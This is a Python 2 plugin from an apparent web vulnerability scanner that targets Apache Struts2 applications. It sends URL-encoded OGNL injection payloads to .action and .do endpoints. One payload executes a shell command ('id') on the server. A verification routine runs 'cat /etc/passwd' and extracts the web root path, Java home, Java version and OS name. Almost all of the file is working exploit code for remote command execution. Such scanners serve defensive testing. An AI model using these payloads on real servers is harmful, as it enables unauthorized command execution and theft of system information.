#!/usr/bin/python
# -*- coding: utf-8 -*-
import logging
import urllib2
import urlparse
import re
from lib.common import *

def run_url(http,ob,item):
    print "--==--==-==--==-===----"
    print ob['isstart']
    print "--==--==-==--==-===----"
    try:
        # if item['method'] != 'get':
        #     return []
        #end if
        # type = item['url'].split('.')[-1]
        # type=type.lower()
        # if type != 'action' and type != 'do':
        #     return []
        #end if
        path = urlparse.urlparse(item['url']).path
        if path.find(".action")<0 and path.find(".do")<0:
            return []

        # if item['params']!="" and item['method']=='get':
            
        #     url = "%s?%s" % (item['url'],item['params'])
        # else:
        #     url = item['url']
        url = item['url']
        list = []
        detail = u"Struts2 框架是在Struts 和WebWork的技术基础上进行了合并后的全新框架。其全新的Struts 2的体系结构与Struts 1的体系结构的差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与Servlet API完全脱离开，所以Struts 2可以理解为WebWork的更新产品。Struts框架广泛应用于政府、公安、交通、金融行业和运营商的网站建设，作为网站开发的底层模板使用，目前大量开发者利用J2ee 开发 Web 应用的时候都会利用这个框架。"
        detail = detail.encode('utf8') 
        test1 = "?%28%27%5C43_memberAccess[%5C%27allowStaticMethodAccess%5C%27]%27%29%28meh%29=true&%28aaa%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28d%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28asdf%29%28%28%27%5C43rp%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28c%29%29&%28fgd%29%28%28%27%5C43rp.getWriter%28%29.print%28%22NVS_TEST%22%29%27%29%28d%29%29&%28fgd%29&%28grgr%29%28%28%27%5C43rp.getWriter%28%29.close%28%29%27%29%28d%29%29=1"
#        test2 = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
        test3="?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28h%29%28%28%27%5C43webRootzpro%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43req.getParameter%28%22lee%22%29%29%27%29%28d%29%29&%28i%29%28%28%27%5C43webRootzproreader%5C75new%5C40java.io.DataInputStream%28%5C43webRootzpro.getInputStream%28%29%29%27%29%28d%29%29&%28i01%29%28%28%27%5C43webStr%5C75new%5C40byte[51020]%27%29%28d%29%29&%28i1%29%28%28%27%5C43webRootzproreader.readFully%28%5C43webStr%29%27%29%28d%29%29&%28i111%29%28%28%27%5C43webStr12%5C75new%5C40java.lang.String%28%5C43webStr%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43webStr12%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&lee=id"
        yx=urllib2.urlopen("%s%s" % (url,test1))
        if yx.readline().find("NVS_TEST")>=0:
            print "3333333333"
            print yx.readline()
        
            request = getRequest("%s%s" % (url,test1))
            res = {}
            header = yx.info()
            for key in header:
                res[key] = header[key]
            #end for
            res['status'] = '200'
            response = getResponse(res)
            if ob['isstart']=='1' :
                ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name=Verification(url)
                if ospath_name!='' or javahome_name!='' or javaversion_name!='' or osname_name!='' or cmdcatpasswd_name!='':
                    detail = "%s\n\n验证性扫描结果：\n\n" % (detail)
                    if ospath_name and ospath_name != "":
                        detail = "%s网站路径：%s\n" % (detail,ospath_name)
                    #end if
                    if javahome_name and javahome_name != "":
#                        print "java 目录"
                        detail = "%sJAVA目录：%s\n" % (detail,javahome_name)
                    #end if
                    if javaversion_name and javaversion_name != "":
#                        print "JAVA版本"
                        detail = "%sJAVA版本：%s\n" % (detail,javaversion_name)
                    #end if
                    if osname_name and osname_name != "":
#                        print "s系统名"
                        detail = "%s系统名：%s\n" % (detail,osname_name)
                    #end if
                    if cmdcatpasswd_name and cmdcatpasswd_name != "":
                        detail = "%s命令执行结果：\n%s\n" % (detail,cmdcatpasswd_name)
                    #end if

                    #detail="%s\n\n验证性扫描结果：\n\n网站路径：%s\njava目录：%s\njava版本：%s\n系统名：%s\n命令执行结果：\n%s"%(detail,ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
            
            #print detail
            return list
        #end if
#        x=urllib2.urlopen("%s%s" % (url,test2))
##        dir=x.read()
##        print "====================="
##        print dir
##        print "===================="
#        dircontet= x.readline()
##        print "----------------------"
##        print dircontet
##        print"---------------------------"
#        if dircontet.find("</script>")<0 and dircontet.find("<!DOCTYPE")<0 and dircontet.find("</html>")<0 and dircontet.find("</TITLE>")<0 and dircontet.find("<body>")<0:
#            print "dddddddd"
#            m = re.search(r"[a-zA-Z]:(\\([0-9a-zA-Z]+))+|(\/([0-9a-zA-Z]+))+",dircontet,re.I)
#            if m:
#                
#                request = getRequest("%s%s" % (url,test2))
#                res = {}
#                header = x.info()
#                for key in header:
#                    res[key] = header[key]
#                #end for
#                res['status'] = '200'
#                response = getResponse(res)
#                if ob['isstart']=='1' :
#                    ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name=Verification(url)
#                    if ospath_name!='' or javahome_name!='' or javaversion_name!='' or osname_name!='' or cmdcatpasswd_name!='':
#
#                        detail="%s\n验证性扫描结果：\n网站路径：%s\njava目录：%s\njava版本：%s\n系统名：%s\n命令执行结果：\n%s"%(detail,ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name)
#                list.append(getRecord(ob,url,ob['level'],detail,request,response))
#                
#                return list
            #end if
            #end for
        s = urllib2.urlopen("%s%s" % (url,test3))
        if re.search(r"uid=[0-9]{0,20}\(.{0,20}\)\sgid=[0-9]{0,20}\(.{0,20}\)\sgroups=[0-9]{0,20}\(.{0,20}\)",s.read()):
            request = getRequest("%s%s" % (url,test2))
            res = {}
            header = s.info()
            for key in header:
                res[key] = header[key]
            #end for
            res['status'] = '200'
            response = getResponse(res)
            if ob['isstart']=='1' :
                ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name=Verification(url)
                if ospath_name!='' or javahome_name!='' or javaversion_name!='' or osname_name!='' or cmdcatpasswd_name!='':
                    
                    detail = "%s\n\n验证性扫描结果：\n\n" % (detail)
                    if ospath_name and ospath_name != "":
                        detail = "%s网站路径：%s\n" % (detail,ospath_name)
                    #end if
                    if javahome_name and javahome_name != "":
#                        print "java 目录"
                        detail = "%sJAVA目录：%s\n" % (detail,javahome_name)
                    #end if
                    if javaversion_name and javaversion_name != "":
#                        print "JAVA版本"
                        detail = "%sJAVA版本：%s\n" % (detail,javaversion_name)
                    #end if
                    if osname_name and osname_name != "":
#                        print "s系统名"
                        detail = "%s系统名：%s\n" % (detail,osname_name)
                    #end if
                    if cmdcatpasswd_name and cmdcatpasswd_name != "":
                        detail = "%s命令执行结果：\n%s\n" % (detail,cmdcatpasswd_name)
                    #end if

#                    detail="%s\n验证性扫描结果：\n网站路径：%s\njava目录：%s\njava版本：%s\n系统名：%s\n命令执行结果：\n%s"%(detail,ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
          
            return list
        #end if
        return list
    
    except Exception,e:
        logging.getLogger().error("File:StructsScript.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'] + ", url:" + item['url'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:StructsScript.py, run_url function :" + str(e)+ ", url:" + item['url'])
        return []
    #ene  try
#end def


def Verification(url):
    
    ospath_name=""
    
    javahome_name=""
    
    javaversion_name=""
    
    osname_name=""
    
    cmdcatpasswd_name=""
    
    try:
        
        cmdcatpasswd="?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28h%29%28%28%27%5C43webRootzpro%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43req.getParameter%28%22lee%22%29%29%27%29%28d%29%29&%28i%29%28%28%27%5C43webRootzproreader%5C75new%5C40java.io.DataInputStream%28%5C43webRootzpro.getInputStream%28%29%29%27%29%28d%29%29&%28i01%29%28%28%27%5C43webStr%5C75new%5C40byte[51020]%27%29%28d%29%29&%28i1%29%28%28%27%5C43webRootzproreader.readFully%28%5C43webStr%29%27%29%28d%29%29&%28i111%29%28%28%27%5C43webStr12%5C75new%5C40java.lang.String%28%5C43webStr%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43webStr12%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&lee=cat+%2Fetc%2Fpasswd"
        
        ospath="?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
        
        javahome="?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28@java.lang.System@getProperty%28%22java.home%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
        
        javaverson="?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28@java.lang.System@getProperty%28%22java.version%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
        
        osname="?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i95%29%28%28%27%5C43xman.getWriter%28%29.println%28@java.lang.System@getProperty%28%22os.name%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
        
        r=urllib2.urlopen("%s%s"%(url,ospath))
        
        ospath_name=r.read()
        if ospath_name.find("</script>")<0 and ospath_name.find("<!DOCTYPE")<0 and ospath_name.find("</html>")<0 and ospath_name.find("</TITLE>")<0 and ospath_name.find("<body>")<0:
            m = re.search(r"[a-zA-Z]:(\\([0-9a-zA-Z]+))+|(\/([0-9a-zA-Z]+))+",ospath_name,re.I)
            if not  m:
            
                ospath_name="None"
            #end if 
        else:
            ospath_name="None"
        #end if 
        
        r1=urllib2.urlopen("%s%s"%(url,javahome))
        
        javahome_name=r1.read()
        print javahome_name
        
        r2=urllib2.urlopen("%s%s"%(url,javaverson))
        
        javaversion_name=r2.read()
        print javaversion_name
        
        r3=urllib2.urlopen("%s%s"%(url,osname))
        
        osname_name=r3.read()
        print osname_name
        
        r4=urllib2.urlopen("%s%s"%(url,cmdcatpasswd))
        
        cmdcatpasswd_name=r4.read()
        m = re.search(r"/bin/(bash|sh)[^\r\n<>]*[\r\n]",cmdcatpasswd_name,re.I)
        if not m:
            cmdcatpasswd_name="None"
        
    except Exception,e:
        
        logging.getLogger().error("structs.verification"+str(e))
        
    return ospath_name,javahome_name,javaversion_name,osname_name,cmdcatpasswd_name

  
if  __name__=='__main__':
    Verification()



